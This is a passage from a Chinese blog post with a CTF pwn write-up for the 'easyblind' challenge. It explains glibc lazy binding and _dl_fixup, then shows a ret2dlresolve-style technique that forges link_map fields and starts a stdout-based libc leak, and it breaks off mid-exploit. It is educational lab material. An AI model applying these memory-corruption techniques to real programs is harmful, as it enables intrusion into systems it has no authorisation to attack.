

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
  <link rel="icon" href="/img/fluid.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="pw">
  <meta name="keywords" content="">
  
    <meta name="description" content="2024极客巅峰pwneasyblind赛后根据这篇博客做出来了，强网杯qwarmup - Csc8_Blog 首先来补充一些基础知识(x64elf文件的动态链接过程) 什么是动态链接​	随着系统中的可执行文件的增加，静态链接带来的磁盘和内存空间的浪费也就越来越严重，例如：大部分的可执行文件都是需要glibc，那么静态链接就会把libc.a(静态链接库)和编写的代码链接进去，试想一下，一个libc">
<meta property="og:type" content="article">
<meta property="og:title" content="2024极客巅峰pwn">
<meta property="og:url" content="http://example.com/2024/08/18/2024%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/index.html">
<meta property="og:site_name" content="pw">
<meta property="og:description" content="2024极客巅峰pwneasyblind赛后根据这篇博客做出来了，强网杯qwarmup - Csc8_Blog 首先来补充一些基础知识(x64elf文件的动态链接过程) 什么是动态链接​	随着系统中的可执行文件的增加，静态链接带来的磁盘和内存空间的浪费也就越来越严重，例如：大部分的可执行文件都是需要glibc，那么静态链接就会把libc.a(静态链接库)和编写的代码链接进去，试想一下，一个libc">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/2024/08/18/2024%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/1.png">
<meta property="og:image" content="http://example.com/2024/08/18/2024%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/2.png">
<meta property="og:image" content="http://example.com/2024/08/18/2024%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/3.png">
<meta property="og:image" content="http://example.com/2024/08/18/2024%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/4.png">
<meta property="og:image" content="http://example.com/2024/08/18/2024%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/5.png">
<meta property="og:image" content="http://example.com/2024/08/18/2024%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/6.png">
<meta property="og:image" content="http://example.com/2024/08/18/2024%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/7.png">
<meta property="og:image" content="http://example.com/2024/08/18/2024%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/8.png">
<meta property="og:image" content="http://example.com/2024/08/18/2024%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/9.png">
<meta property="og:image" content="http://example.com/2024/08/18/2024%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/10.png">
<meta property="og:image" content="http://example.com/2024/08/18/2024%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/11.png">
<meta property="og:image" content="http://example.com/2024/08/18/2024%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/12.png">
<meta property="og:image" content="http://example.com/2024/08/18/2024%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/13.png">
<meta property="og:image" content="http://example.com/2024/08/18/2024%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/14.png">
<meta property="og:image" content="http://example.com/2024/08/18/2024%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/15.png">
<meta property="og:image" content="http://example.com/2024/08/18/2024%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/16.png">
<meta property="article:published_time" content="2024-08-18T10:52:03.000Z">
<meta property="article:modified_time" content="2024-10-31T03:47:25.271Z">
<meta property="article:author" content="pw">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="http://example.com/2024/08/18/2024%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/1.png">
  
  
  
  <title>2024极客巅峰pwn - pw</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"y2JhJN2Q6Bvhk7i3zBmRYZkn-gzGzoHsz","app_key":"NSFQG1YUdY6huW8XwmlgXGLG","server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  

  

  
    <!-- Google tag (gtag.js) -->
    <script async>
      if (!Fluid.ctx.dnt) {
        Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=", function() {
          window.dataLayer = window.dataLayer || [];
          function gtag() {
            dataLayer.push(arguments);
          }
          gtag('js', new Date());
          gtag('config', '');
        });
      }
    </script>
  

  

  

  

  
    
  



  
<meta name="generator" content="Hexo 7.2.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>pw</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/" target="_self">
                <i class="iconfont icon-category-fill"></i>
                <span>分类</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/" target="_self">
                <i class="iconfont icon-tags-fill"></i>
                <span>标签</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/" target="_self">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="2024极客巅峰pwn"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2024-08-18 18:52" pubdate>
          2024年8月18日 晚上
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          3.2k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          27 分钟
        
      </span>
    

    
    
      
        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
          <i class="iconfont icon-eye" aria-hidden="true"></i>
          <span id="leancloud-page-views"></span> 次
        </span>
        
      
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">2024极客巅峰pwn</h1>
            
            
              <div class="markdown-body">
                
                <h1 id="2024极客巅峰pwn"><a href="#2024极客巅峰pwn" class="headerlink" title="2024极客巅峰pwn"></a><center>2024极客巅峰pwn</h1><h2 id="easyblind"><a href="#easyblind" class="headerlink" title="easyblind"></a>easyblind</h2><p>赛后根据这篇博客做出来了，<a target="_blank" rel="noopener" href="https://csc8.github.io/2023/04/06/qwarmup/#%E7%9F%A5%E8%AF%86%E7%82%B9">强网杯qwarmup - Csc8_Blog</a></p>
<p>首先来补充一些基础知识(x64elf文件的动态链接过程)</p>
<h3 id="什么是动态链接"><a href="#什么是动态链接" class="headerlink" title="什么是动态链接"></a>什么是动态链接</h3><p>​	随着系统中的可执行文件的增加，静态链接带来的磁盘和内存空间的浪费也就越来越严重，例如：大部分的可执行文件都是需要glibc，那么静态链接就会把libc.a(静态链接库)和编写的代码链接进去，试想一下，一个libc.a的大小为5M左右，那么1000个就是5G，并且在装载入内存中时也是如此，如果两个文件链接了相同的.a文件，那么内存都会装载一次，造成重复，所以就有了动态链接，将系统库和自己所编写的代码分割成两个独立的模块，等到程序运行的时候再将这两个模块链接起来，这样即节省了硬盘空间，也节省了内存空间。</p>
<h3 id="延时绑定"><a href="#延时绑定" class="headerlink" title="延时绑定"></a>延时绑定</h3><p>​	当程序在linux中执行时，他不能准确的定位到库中的函数，这时就需要动态链接器去解析对库中符号的引用，而解析符号的过程就称为延时绑定，这也是本题的主要攻击手段</p>
<h3 id="demo演示"><a href="#demo演示" class="headerlink" title="demo演示"></a>demo演示</h3><p>​	首先来看看延时绑定的一个过程，这里演示用的版本是glibc2.31</p>
<img src="/2024/08/18/2024%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/1.png" srcset="/img/loading.gif" lazyload class="">

<p></p>

<img src="/2024/08/18/2024%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/2.png" srcset="/img/loading.gif" lazyload class="">

<p>​	这里我们可以看到，由于是第一次调用printf函数，此时libc地址还并没有写入got表中</p>
<img src="/2024/08/18/2024%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/3.png" srcset="/img/loading.gif" lazyload class="">

<p>​	而这个位置可以看到他有两个push指令，其中0就代表reloc_arg，而另外一个则是link_map，最后进入了_dl_runtime_resolve_xsavec函数中</p>
<img src="/2024/08/18/2024%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/4.png" srcset="/img/loading.gif" lazyload class="">

<p>​	接着往下看会发现它实际上是将push的两个参数传入_dl_fixup函数中</p>
<p>在分析_dl_fixup函数之前，这里要介绍一下三个重要的部分</p>
<figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs elm"><span class="hljs-type">JMPREL</span>(.rela.plt)：<br>	它由<span class="hljs-number">0x18</span>字节对齐的<span class="hljs-type">ELF64_Rel</span>结构体构成<br>	typedef struct&#123;<br>		<span class="hljs-type">Elf64_Addr</span>  r_offset;<br>		<span class="hljs-type">Elf64_Word</span>	r_info;<br>		<span class="hljs-type">Elf64_Sxword</span> r_addend;        /* <span class="hljs-type">Addend</span> */<br>	&#125;<span class="hljs-type">Elf64_Rela</span>;<br>		r_offset:包含存储已解析符号的地址的位置（在 <span class="hljs-type">GOT</span> 中）<br>		r_info：表示重定位类型，作为符号表索引。它将用于在 <span class="hljs-type">DYNSYM</span> 部分中定位相应的 <span class="hljs-type">Elf64_Sym</span> 结构<br><br><span class="hljs-type">DYNSYM</span> (.dynsym)：<br>	包含一个符号表。它由 <span class="hljs-number">0x18</span> 字节对齐的<br>	typedef struct&#123;<br>		<span class="hljs-type">Elf64_Word</span>		st_name;<br>		unsigned char 	st_info;<br>		unsigned char	st_other;<br>		<span class="hljs-type">Elf64_Section</span>   st_shndex;<br>		<span class="hljs-type">Elf64_Addr</span> 		st_value;<br>		<span class="hljs-type">Elf64_Xword</span>     st_size;<br>	&#125;<span class="hljs-type">Elf64_Sym</span>;<br>		st_name：它充当字符串表索引。它将用于在 <span class="hljs-type">STRTAB</span> 部分中定位正确的字符串。<br>		st_info：它包含符号的类型和绑定属性。<br>		st_other：包含符号的可见性。<br>		st_shndx：包含相关的节头表索引。<br>		st_value：它包含关联符号的值。<br>		st_size：它包含符号的大小。如果符号没有大小或大小未知，则它包含 <span class="hljs-number">0</span>。<br><br><span class="hljs-type">STRTAB</span> (.dynstr)：<br>	存放函数字符串名<br></code></pre></td></tr></table></figure>

<p>​	好的接下来就进入最折磨的源码分析环节</p>
<figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><code class="hljs xl">_dl_fixup (struct link_map *l, ElfW(Word) reloc_arg) <span class="hljs-comment">// 第一个参数link_map，也就是got[1]</span><br>&#123;<br>    <span class="hljs-comment">// 获取link_map中存放DT_SYMTAB的地址</span><br>  const ElfW(Sym) *const symtab = (const void *) D_PTR (l, l_info[DT_SYMTAB]);<br>    <span class="hljs-comment">// 获取link_map中存放DT_STRTAB的地址</span><br>  const char *strtab = (const void *) D_PTR (l, l_info[DT_STRTAB]);<br>    <span class="hljs-comment">// reloc_offset就是reloc_arg,获取重定位表项中对应函数的结构体</span><br>  const PLTREL *const reloc = (const void *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);<br>    <span class="hljs-comment">// 根据重定位结构体的r_info得到symtab表中对应的结构体</span><br>  <span class="hljs-function"><span class="hljs-title">const</span> ElfW(Sym) *sym = &amp;symtab[ELFW(R_SYM) (reloc-&gt;</span>r_info)];<br>  <br>  <span class="hljs-function"><span class="hljs-title">void</span> *const rel_addr = (void *)(l-&gt;</span><span class="hljs-function"><span class="hljs-title">l_addr</span> + reloc-&gt;</span>r_offset);<br>  lookup_t result;<br>  DL_FIXUP_VALUE_TYPE value;<br><br>  <span class="hljs-comment">/* Sanity check that we&#x27;re really looking at a PLT relocation.  */</span><br>  <span class="hljs-function"><span class="hljs-title">assert</span> (ELFW(R_TYPE)(reloc-&gt;</span>r_info) == ELF_MACHINE_JMP_SLOT); <span class="hljs-comment">// 检查r_info的最低位是不是7</span><br><br>   <span class="hljs-comment">/* Look up the target symbol.  If the normal lookup rules are not</span><br><span class="hljs-comment">      used don&#x27;t look in the global scope.  */</span><br>  <span class="hljs-function"><span class="hljs-title">if</span> (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;</span>st_other), <span class="hljs-number">0</span>) == <span class="hljs-number">0</span>) <span class="hljs-comment">// 这里是一层检测，检查sym结构体中的st_other是否为0，正常情况下为0，执行下面代码</span><br>    &#123;<br>      const struct r_found_version *version = NULL;<br>         <span class="hljs-comment">// 这里也是一层检测，检查link_map中的DT_VERSYM是否为NULL，正常情况下不为NULL，执行下面代码</span><br>      <span class="hljs-function"><span class="hljs-title">if</span> (l-&gt;</span>l_info[VERSYMIDX (DT_VERSYM)] != NULL)<br>        &#123;<br>          <span class="hljs-comment">// 到了这里就是64位下报错的位置，在计算版本号时，vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; 0x7fff的过程中，由于我们一般伪造的symtab位于bss段</span><br>          <span class="hljs-comment">// 就导致在64位下reloc-&gt;r_info比较大,故程序会发生错误。所以要使程序不发生错误，自然想到的办法就是不执行这里的代码，分析上面的代码我们就可以得到两种手段</span><br>          <span class="hljs-comment">// 第一种手段就是使上一行的if不成立，也就是设置link_map中的DT_VERSYM为NULL，那我们就要泄露出link_map的地址，而如果我们能泄露地址，根本用不着ret2dlresolve。</span><br>          <span class="hljs-comment">// 第二种手段就是使最外层的if不成立，也就是使sym结构体中的st_other不为0，直接跳到后面的else语句执行。</span><br>          const ElfW(Half) *vernum = (const void *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);<br>          E<span class="hljs-function"><span class="hljs-title">lfW</span>(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;</span>r_info)] &amp; <span class="hljs-number">0</span>x7fff;<br>          <span class="hljs-function"><span class="hljs-title">version</span> = &amp;l-&gt;</span>l_versions[ndx];<br>          <span class="hljs-function"><span class="hljs-title">if</span> (version-&gt;</span>hash == <span class="hljs-number">0</span>)<br>            version = NULL;<br>        &#125;<br><br>      <span class="hljs-comment">/* We need to keep the scope around so do some locking.  This is</span><br><span class="hljs-comment">     not necessary for objects which cannot be unloaded or when</span><br><span class="hljs-comment">     we are not using any threads (yet).  */</span><br>      int flags = DL_LOOKUP_ADD_DEPENDENCY;<br>      <span class="hljs-keyword">if</span> (!RTLD_SINGLE_THREAD_P)<br>        &#123;<br>          THREAD_GSCOPE_SET_FLAG ();<br>          flags |= DL_LOOKUP_GSCOPE_LOCK;<br>        &#125;<br><br>      RTLD_ENABLE_FOREIGN_CALL;<br>    <span class="hljs-comment">// 在32位情况下，上面代码运行中不会出错，就会走到这里，这里通过strtab+sym-&gt;st_name找到符号表字符串，result为libc基地址</span><br>      <span class="hljs-function"><span class="hljs-title">result</span> = _dl_lookup_symbol_x (strtab + sym-&gt;</span><span class="hljs-function"><span class="hljs-title">st_name</span>, l, &amp;sym, l-&gt;</span>l_scope,<br>                    version, ELF_RTYPE_CLASS_PLT, flags, NULL);<br><br>      <span class="hljs-comment">/* We are done with the global scope.  */</span><br>      <span class="hljs-keyword">if</span> (!RTLD_SINGLE_THREAD_P)<br>    THREAD_GSCOPE_RESET_FLAG ();<br><br>      RTLD_FINALIZE_FOREIGN_CALL;<br><br>      <span class="hljs-comment">/* Currently result contains the base load address (or link map)</span><br><span class="hljs-comment">     of the object that defines sym.  Now add in the symbol</span><br><span class="hljs-comment">     offset.  */</span><br>      <span class="hljs-comment">// 同样，如果正常执行，接下来会来到这里，得到value的值，为libc基址加上要解析函数的偏移地址，也即实际地址，即result+st_value</span><br>      <span class="hljs-function"><span class="hljs-title">value</span> = DL_FIXUP_MAKE_VALUE (result, sym ? (LOOKUP_VALUE_ADDRESS (result) + sym-&gt;</span>st_value) : <span class="hljs-number">0</span>);<br>    &#125;<br>  <span class="hljs-keyword">else</span><br>    &#123; <br>      <span class="hljs-comment">// 这里就是64位下利用的关键，在最上面的if不成立后，就会来到这里,这里value的计算方式是 l-&gt;l_addr + st_value</span><br>      <span class="hljs-comment">// 我们的目的是使value为我们所需要的函数的地址，所以就得控制两个参数，l_addr 和 st_value</span><br>      <span class="hljs-comment">/* We already found the symbol.  The module (and therefore its load</span><br><span class="hljs-comment">     address) is also known.  */</span><br>      <span class="hljs-function"><span class="hljs-title">value</span> = DL_FIXUP_MAKE_VALUE (l, l-&gt;</span><span class="hljs-function"><span class="hljs-title">l_addr</span> + sym-&gt;</span>st_value);<br>      result = l;<br>    &#125;<br><br>  <span class="hljs-comment">/* And now perhaps the relocation addend.  */</span><br>  value = elf_machine_plt_value (l, reloc, value);<br><br>  <span class="hljs-keyword">if</span> (sym != NULL<br>      &amp;&amp; __<span class="hljs-function"><span class="hljs-title">builtin_expect</span> (ELFW(ST_TYPE) (sym-&gt;</span>st_info) == STT_GNU_IFUNC, <span class="hljs-number">0</span>))<br>    value = elf_ifunc_invoke (DL_FIXUP_VALUE_ADDR (value));<br><br>  <span class="hljs-comment">/* Finally, fix up the plt itself.  */</span><br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (GLRO(dl_bind_not)))<br>    return value;<br>  <span class="hljs-comment">// 最后把value写入相应的GOT表条目中</span><br>  return elf_machine_fixup_plt (l, result, reloc, rel_addr, value);<br>&#125;<br><span class="hljs-comment">//来自 https://blog.csdn.net/qq_51868336/article/details/114644569</span><br></code></pre></td></tr></table></figure>

<p>​	根据源码我们就知道了.rel.plt 、.dynsym、.dynstr 段的地址都是从 l -&gt; l_info[] 中取的，所以 l -&gt; l_info 又对应了 .dynamic 段，这里我们可以在 IDA 看到 .dynamic 段的内容</p>
<img src="/2024/08/18/2024%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/5.png" srcset="/img/loading.gif" lazyload class="">

<p>​	如果是ret2dlresolve手法的话，这里的总结就是</p>
<figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xl">st_other != <span class="hljs-number">0</span><br><br><span class="hljs-function"><span class="hljs-title">l</span> -&gt;</span> <span class="hljs-function"><span class="hljs-title">l_addr</span> = system_libc - a_libc；sym -&gt;</span> st_value = a_got （其中，a 函数是已经被解析过的一个函数）<br></code></pre></td></tr></table></figure>

<p>ok，接着就可以回到这道题本身了</p>
<h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><img src="/2024/08/18/2024%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/6.png" srcset="/img/loading.gif" lazyload class="">

<p>​	题目分析可知就是一次地址任意写一字节的操作，但是这里要注意，他这里的程序本身不是写在main函数中的，而是在main函数之前就开始执行了</p>
<p>​	如果绕过了_Exit函数去调试会发现程序执行完main函数后最后会进入</p>
<img src="/2024/08/18/2024%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/7.png" srcset="/img/loading.gif" lazyload class="">

<p>​	然后循环执行函数，其中</p>
<img src="/2024/08/18/2024%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/8.png" srcset="/img/loading.gif" lazyload class="">

<p>​	这里的题目函数就在这个第二个，所以我们的首要目标就是拥有无限循环，这里的条件只需绕过_Exit函数即可。</p>
<h3 id="开始做题"><a href="#开始做题" class="headerlink" title="开始做题"></a>开始做题</h3><p>​	这里绕过也很简单，我们利用延时绑定的机制，将原本要写入wirte函数的libc地址改为写入到_Exit即可，前面的源码分析中也写到了是通过link_map-&gt;l_addr来确定函数回填的地址的</p>
<img src="/2024/08/18/2024%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/9.png" srcset="/img/loading.gif" lazyload class="">

<p>​	那这里我们将link_map-&gt;l_addr修改，使得修改后的地址写入_Exit的got位置，这样即可绕过_Exit，也因为地址是写入的_Exit的got，从而导致write的got表地址没变，下次循环时又要进入延时绑定的函数，如此循环</p>
<img src="/2024/08/18/2024%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/10.png" srcset="/img/loading.gif" lazyload class="">

<p>​	现在有了无限一字节修改内存的办法，那么现在就可以想着去泄露libc基地址了，这里就可以利用_IO_flush_all去刷新IO流，刷新两次，第一次先将libc的地址留在_IO_write_ptr中，第二次就可以泄露处libc基地址了，那么想要利用_IO_flush_all去刷新IO流，首先必要的就是能够使用_IO_flush_all函数，前面也提过是通过函数字符串名来定位的libc函数，那么我们便可以去伪造这一部分，但这里前提要注意一点的是，由于题目只提供了与libc的偏移，所以我们想办法在libc的偏移内去修改这一范围</p>
<img src="/2024/08/18/2024%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/11.png" srcset="/img/loading.gif" lazyload class="">

<p>​	也就是说他这里原本是通过0x3e78存放的值去定位函数字符串的</p>
<img src="/2024/08/18/2024%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/12.png" srcset="/img/loading.gif" lazyload class="">

<p>​	并且他是通过link_map中的l_info去赋值的，所以他是存在于libc上的一个的一个地址，那么就是我们可以修改的，根据这个博客作者的描述，这里也是给我们找了一个用于修改的位置，也就是我画横线的DT_DEBUG处，至于其中的定位字符串的偏移，这里得通过调试去得知，我们先修改link_map上的地址原本为STRTAB的地方为DT_DEBUG</p>
<img src="/2024/08/18/2024%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/13.png" srcset="/img/loading.gif" lazyload class="">

<p></p>

<img src="/2024/08/18/2024%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/14.png" srcset="/img/loading.gif" lazyload class="">

<p>​	可以看到由于我们修改为了DT_DEBUG，那么他就会_r_debug的位置作为去查找函数值的一个基地址，同时可以看到这里是加上了0x3e来查找</p>
<img src="/2024/08/18/2024%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/15.png" srcset="/img/loading.gif" lazyload class="">

<p>​	对于的代码就是此处，OK，那我们就知道此处的偏移，开始修改</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-keyword">stdout</span> = libc_base + libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stdout_&#x27;</span>]<br>lss(<span class="hljs-string">&#x27;stdout&#x27;</span>)<br>write_all(<span class="hljs-keyword">stdout</span>,p32(<span class="hljs-number">0xfbad3887</span>))   <span class="hljs-comment">#_flags</span><br>write_all(<span class="hljs-keyword">stdout</span>+<span class="hljs-number">0x28</span>,b<span class="hljs-string">&#x27;\xff&#x27;</span>)  